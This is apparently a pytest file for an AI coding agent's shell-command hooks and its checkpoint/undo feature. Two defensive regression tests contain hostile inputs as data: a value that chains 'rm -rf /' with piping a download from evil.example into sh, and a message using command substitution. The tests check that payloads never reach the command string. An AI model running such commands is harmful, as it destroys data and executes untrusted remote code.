"""Hooks (event → shell command) and checkpoints (pre-write snapshot + undo)."""

from __future__ import annotations

import asyncio
import json

from oaset.agent import AgentLoop, Conversation
from oaset.config import default_config, load_config, save_config
from oaset.credentials import load_credential  # noqa: F401  (import sanity)
from oaset.hooks import HookRunner
from oaset.providers import MockProvider, MockToolCall, MockTurn
from oaset.session import SessionStore
from oaset.tools import AutoGate, ToolContext, ToolRegistry

# --------------------------------------------------------------------- hooks


def test_config_hooks_roundtrip(isolated_home):
    cfg = default_config()
    cfg.hooks = {"on_turn_end": "echo done", "bogus_event": "ignored"}
    save_config(cfg)
    loaded = load_config()
    assert loaded.hooks == {"on_turn_end": "echo done"}


async def test_hook_runner_runs_command_with_env(workspace, tmp_path):
    log = tmp_path / "hook.log"
    runner = HookRunner({"on_user_message": f'echo "$OASET_USER_TEXT" >> "{log}"'}, workspace)
    assert runner.active
    await runner.fire("on_user_message", user_text="hello hook")
    await asyncio.sleep(0.1)
    assert "hello hook" in log.read_text(encoding="utf-8")


async def test_hook_failures_are_silent(workspace):
    runner = HookRunner({"on_tool_end": "definitely-not-a-command-xyz"}, workspace)
    await runner.fire("on_tool_end", tool_name="x")  # must not raise
    assert HookRunner({}, workspace).active is False


async def test_loop_fires_hooks(workspace, tmp_path):
    log = tmp_path / "events.log"
    hooks = HookRunner(
        {
            "on_user_message": f'echo "$OASET_EVENT:$OASET_USER_TEXT" >> "{log}"',
            "on_turn_end": f'echo "$OASET_EVENT" >> "{log}"',
            "on_tool_start": f'echo "$OASET_TOOL_NAME" >> "{log}"',
            "on_tool_end": f'echo "end:$OASET_TOOL_NAME" >> "{log}"',
        },
        workspace,
    )
    (workspace / "f.txt").write_text("x", encoding="utf-8")
    provider = MockProvider([
        MockTurn(tool_calls=[MockToolCall("read_file", {"path": "f.txt"})]),
        MockTurn(content_chunks=["done"]),
    ])
    registry = ToolRegistry(gate=AutoGate())
    registry.bind(ToolContext(cwd=workspace, mode="auto", output_limit=200))
    loop = AgentLoop(provider, registry, Conversation(system_prompt="s"), hooks=hooks)
    await loop.run("go", lambda e: None)
    await asyncio.sleep(0.3)
    content = log.read_text(encoding="utf-8")
    assert "on_user_message:go" in content
    assert "read_file" in content and "end:read_file" in content
    assert content.strip().splitlines()[-1] == "on_turn_end"


# --------------------------------------------------------------- checkpoints


def test_checkpoint_and_undo_roundtrip(isolated_home, workspace):
    store = SessionStore()
    session = store.new_session(workspace, model="m")
    target = workspace / "doc.txt"
    target.write_text("original", encoding="utf-8")

    target.write_text("modified", encoding="utf-8")  # simulate the agent's write
    store.checkpoint(session, {str(target): "original"})

    created = workspace / "new.txt"
    created.write_text("created", encoding="utf-8")
    store.checkpoint(session, {str(created): None})  # snapshot: file did not exist

    undone = store.undo_latest(session)
    assert undone is not None
    assert not created.exists()  # creation rolled back
    undone = store.undo_latest(session)
    assert undone is not None
    assert target.read_text(encoding="utf-8") == "original"
    assert store.undo_latest(session) is None  # stack empty


def test_checkpoint_stack_is_bounded(isolated_home, workspace):
    store = SessionStore()
    session = store.new_session(workspace, model="m")
    for i in range(30):
        store.checkpoint(session, {str(workspace / f"f{i}.txt"): None})
    primary, _legacy = store._ckpt_dirs(session)
    count = len(list(primary.glob("cp_*.json")))
    assert 15 <= count <= 20  # pruned, bounded


async def test_registry_checkpoints_before_write(isolated_home, workspace):
    (workspace / "app.txt").write_text("v1", encoding="utf-8")
    store = SessionStore()
    session = store.new_session(workspace, model="m")
    registry = ToolRegistry(gate=AutoGate())
    ctx = ToolContext(cwd=workspace, mode="auto", output_limit=200)
    registry.bind(ctx)
    ctx.session_state["checkpoint_sink"] = lambda snap: store.checkpoint(session, snap)

    await registry.dispatch(
        "write_file", json.dumps({"path": "app.txt", "content": "v2"})
    )
    assert (workspace / "app.txt").read_text(encoding="utf-8") == "v2"
    store.undo_latest(session)
    assert (workspace / "app.txt").read_text(encoding="utf-8") == "v1"

    # created files are removed by undo
    await registry.dispatch(
        "write_file", json.dumps({"path": "brand-new.txt", "content": "hi"})
    )
    assert (workspace / "brand-new.txt").exists()
    store.undo_latest(session)
    assert not (workspace / "brand-new.txt").exists()


def test_render_hook_command_never_interpolates_payload_values():
    """A4 regression: hook payload (user messages, tool args) must never be
    substituted into the command string — only referenced via the environment."""
    from oaset.hooks import render_hook_command

    env = {
        "OASET_EVENT": "on_user_message",
        "OASET_MESSAGE": "x; rm -rf / && curl http://evil.example/p|sh",
    }
    cmd = render_hook_command("echo $OASET_MESSAGE", env)
    assert "rm -rf" not in cmd
    assert "curl" not in cmd
    assert "OASET_MESSAGE" in cmd  # the reference survives; value travels via env=
    # unknown placeholders stay untouched (legacy semantics)
    assert render_hook_command("echo $OASET_UNSET", env) == "echo $OASET_UNSET"
    assert render_hook_command("echo ${OASET_UNSET}", env) == "echo ${OASET_UNSET}"


async def test_hook_payload_with_shell_metacharacters_stays_data(workspace, tmp_path):
    """End to end: a user message full of shell metacharacters reaches the hook
    as a VALUE, never as a second command."""
    log = tmp_path / "hook.log"
    from oaset.hooks import HookRunner

    runner = HookRunner({"on_user_message": f'echo "$OASET_USER_TEXT" >> "{log}"'}, workspace)
    await runner.fire("on_user_message", user_text='hello $(touch pwned.txt) `id` ; echo second')
    content = log.read_text(encoding="utf-8")
    assert "pwned.txt" in content          # the payload arrived as data
    assert not (workspace / "pwned.txt").exists()


def test_checkpoints_are_isolated_per_session(isolated_home, workspace):
    """D-7: sessions sharing one workdir bucket must NOT share checkpoint
    stacks — /undo in session B can never restore a snapshot from session A."""
    store = SessionStore()
    s1 = store.new_session(workspace, model="m", title="one")
    s2 = store.new_session(workspace, model="m", title="two")
    store.checkpoint(s1, {str(workspace / "a.txt"): "v1"})

    assert store.list_checkpoints(s2) == []          # s2 sees nothing of s1
    assert store.undo_latest(s2) is None             # nothing to restore
    n, restored = store.undo_latest(s1)              # s1's own stack works
    assert n >= 1 and restored == 1
    assert (workspace / "a.txt").read_text(encoding="utf-8") == "v1"


def test_legacy_shared_checkpoints_still_readable(isolated_home, workspace):
    """Sessions created before the per-session split keep seeing their
    bucket-level stack (no data left behind by the upgrade)."""
    import json as _json

    store = SessionStore()
    session = store.new_session(workspace, model="m")
    legacy_dir = session.file.parent / "checkpoints"   # OLD shared layout
    legacy_dir.mkdir(parents=True, exist_ok=True)
    (legacy_dir / "cp_1.json").write_text(_json.dumps(
        {"n": 1, "at": "t", "files": {str(workspace / "old.txt"): "old"}}),
        encoding="utf-8")
    rows = store.list_checkpoints(session)
    assert [r["n"] for r in rows] == [1]
    n, restored = store.undo_latest(session)
    assert n == 1 and restored == 1


# ------------------------------------------------- timeouts end the hook itself


async def test_hook_timeout_kills_the_child(monkeypatch, workspace, tmp_path):
    """A hook that outlives its timeout used to keep running: every tool call
    fired another orphan. The timeout must kill the tree, not just stop
    waiting for it."""
    import oaset.utils as utils_mod
    from oaset.hooks import HOOK_TIMEOUT, HookRunner

    killed: list[object] = []

    async def fake_kill(proc):
        killed.append(proc)
        proc.returncode = -1

    monkeypatch.setattr(utils_mod, "kill_tree_async", fake_kill)
    monkeypatch.setattr("oaset.hooks.HOOK_TIMEOUT", 0.2)
    assert HOOK_TIMEOUT  # the module constant exists; the runner reads it live

    slow_marker = tmp_path / "slow-marker.txt"
    runner = HookRunner(
        {"on_turn_end": f'sleep 2; touch "{slow_marker}"'}, workspace)
    import time as _time

    t0 = _time.monotonic()
    await runner.fire("on_turn_end")
    elapsed = _time.monotonic() - t0
    assert elapsed < 1.5, f"fire() must return at the timeout, took {elapsed:.2f}s"
    assert killed, "the timed-out child must be killed"


async def test_hook_cancellation_propagates_and_kills(monkeypatch, workspace):
    """Esc during a hook must reach the agent loop — the old except clause
    swallowed CancelledError and the interrupt silently did nothing."""
    import oaset.utils as utils_mod

    killed: list[object] = []

    async def fake_kill(proc):
        killed.append(proc)
        proc.returncode = -1

    monkeypatch.setattr(utils_mod, "kill_tree_async", fake_kill)
    runner = HookRunner({"on_turn_end": "sleep 5"}, workspace)

    async def canceller():
        await asyncio.sleep(0.1)
        task.cancel()

    task = asyncio.ensure_future(runner.fire("on_turn_end"))
    asyncio.ensure_future(canceller())
    try:
        await task
        raised = False
    except asyncio.CancelledError:
        raised = True
    assert raised, "cancellation must propagate out of fire()"
    assert killed, "the interrupted child must be killed on the way out"
